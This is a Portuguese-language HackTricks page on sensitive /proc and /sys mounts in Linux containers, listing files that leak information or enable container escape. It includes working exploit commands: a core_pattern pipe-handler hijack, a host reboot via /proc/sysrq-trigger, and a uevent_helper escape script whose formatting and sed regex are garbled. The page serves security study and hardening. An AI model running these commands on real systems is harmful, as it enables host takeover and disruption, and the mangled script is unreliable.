# Sensitive Mounts

{{#include ../../../../banners/hacktricks-training.md}}

A exposição de `/proc` e `/sys` sem a devida isolação de namespace introduz riscos de segurança significativos, incluindo aumento da superfície de ataque e divulgação de informações. Esses diretórios contêm arquivos sensíveis que, se mal configurados ou acessados por um usuário não autorizado, podem levar à fuga de contêiner, modificação do host ou fornecer informações que auxiliem ataques adicionais. Por exemplo, montar incorretamente `-v /proc:/host/proc` pode contornar a proteção do AppArmor devido à sua natureza baseada em caminho, deixando `/host/proc` desprotegido.

**Você pode encontrar mais detalhes sobre cada potencial vulnerabilidade em** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**

## Vulnerabilidades do procfs

### `/proc/sys`

Este diretório permite o acesso para modificar variáveis do kernel, geralmente via `sysctl(2)`, e contém várias subpastas de preocupação:

#### **`/proc/sys/kernel/core_pattern`**

- Descrito em [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
- Permite definir um programa a ser executado na geração de arquivos de core, com os primeiros 128 bytes como argumentos. Isso pode levar à execução de código se o arquivo começar com um pipe `|`.
- **Exemplo de Teste e Exploração**:

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Testar acesso de escrita
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Definir manipulador personalizado
sleep 5 && ./crash & # Acionar manipulador
```

#### **`/proc/sys/kernel/modprobe`**

- Detalhado em [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Contém o caminho para o carregador de módulos do kernel, invocado para carregar módulos do kernel.
- **Exemplo de Verificação de Acesso**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Verificar acesso ao modprobe
```

#### **`/proc/sys/vm/panic_on_oom`**

- Referenciado em [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Uma flag global que controla se o kernel entra em pânico ou invoca o OOM killer quando ocorre uma condição de OOM.

#### **`/proc/sys/fs`**

- Conforme [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), contém opções e informações sobre o sistema de arquivos.
- O acesso de escrita pode permitir vários ataques de negação de serviço contra o host.

#### **`/proc/sys/fs/binfmt_misc`**

- Permite registrar interpretadores para formatos binários não nativos com base em seu número mágico.
- Pode levar à escalada de privilégios ou acesso a shell root se `/proc/sys/fs/binfmt_misc/register` for gravável.
- Exploit relevante e explicação:
- [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
- Tutorial aprofundado: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Outros em `/proc`

#### **`/proc/config.gz`**

- Pode revelar a configuração do kernel se `CONFIG_IKCONFIG_PROC` estiver habilitado.
- Útil para atacantes identificarem vulnerabilidades no kernel em execução.

#### **`/proc/sysrq-trigger`**

- Permite invocar comandos Sysrq, potencialmente causando reinicializações imediatas do sistema ou outras ações críticas.
- **Exemplo de Reinicialização do Host**:

```bash
echo b > /proc/sysrq-trigger # Reinicializa o host
```

#### **`/proc/kmsg`**

- Exibe mensagens do buffer de anel do kernel.
- Pode ajudar em exploits do kernel, vazamentos de endereços e fornecer informações sensíveis do sistema.

#### **`/proc/kallsyms`**

- Lista símbolos exportados do kernel e seus endereços.
- Essencial para o desenvolvimento de exploits do kernel, especialmente para contornar KASLR.
- As informações de endereço são restritas com `kptr_restrict` definido como `1` ou `2`.
- Detalhes em [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/[pid]/mem`**

- Interface com o dispositivo de memória do kernel `/dev/mem`.
- Historicamente vulnerável a ataques de escalada de privilégios.
- Mais sobre [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/kcore`**

- Representa a memória física do sistema em formato ELF core.
- A leitura pode vazar conteúdos de memória do sistema host e de outros contêineres.
- O grande tamanho do arquivo pode levar a problemas de leitura ou falhas de software.
- Uso detalhado em [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

#### **`/proc/kmem`**

- Interface alternativa para `/dev/kmem`, representando a memória virtual do kernel.
- Permite leitura e escrita, portanto, modificação direta da memória do kernel.

#### **`/proc/mem`**

- Interface alternativa para `/dev/mem`, representando a memória física.
- Permite leitura e escrita, a modificação de toda a memória requer a resolução de endereços virtuais para físicos.

#### **`/proc/sched_debug`**

- Retorna informações de agendamento de processos, contornando as proteções do namespace PID.
- Exibe nomes de processos, IDs e identificadores de cgroup.

#### **`/proc/[pid]/mountinfo`**

- Fornece informações sobre pontos de montagem no namespace de montagem do processo.
- Exibe a localização do `rootfs` ou imagem do contêiner.

### Vulnerabilidades do `/sys`

#### **`/sys/kernel/uevent_helper`**

- Usado para manipular `uevents` de dispositivos do kernel.
- Escrever em `/sys/kernel/uevent_helper` pode executar scripts arbitrários ao acionar `uevent`.
- **Exemplo de Exploração**: %%%bash

#### Cria um payload

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### Encontra o caminho do host a partir do ponto de montagem do OverlayFS para o contêiner

host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)

#### Define uevent_helper para o manipulador malicioso

echo "$host_path/evil-helper" > /sys/kernel/uevent_helper

#### Aciona um uevent

echo change > /sys/class/mem/null/uevent

#### Lê a saída

cat /output %%%

#### **`/sys/class/thermal`**

- Controla configurações de temperatura, potencialmente causando ataques DoS ou danos físicos.

#### **`/sys/kernel/vmcoreinfo`**

- Vaza endereços do kernel, potencialmente comprometendo KASLR.

#### **`/sys/kernel/security`**

- Abriga a interface `securityfs`, permitindo a configuração de Módulos de Segurança do Linux como AppArmor.
- O acesso pode permitir que um contêiner desative seu sistema MAC.

#### **`/sys/firmware/efi/vars` e `/sys/firmware/efi/efivars`**

- Expondo interfaces para interagir com variáveis EFI na NVRAM.
- A má configuração ou exploração pode levar a laptops brickados ou máquinas host não inicializáveis.

#### **`/sys/kernel/debug`**

- `debugfs` oferece uma interface de depuração "sem regras" para o kernel.
- Histórico de problemas de segurança devido à sua natureza irrestrita.

### Referências

- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
- [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
- [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)

{{#include ../../../../banners/hacktricks-training.md}}
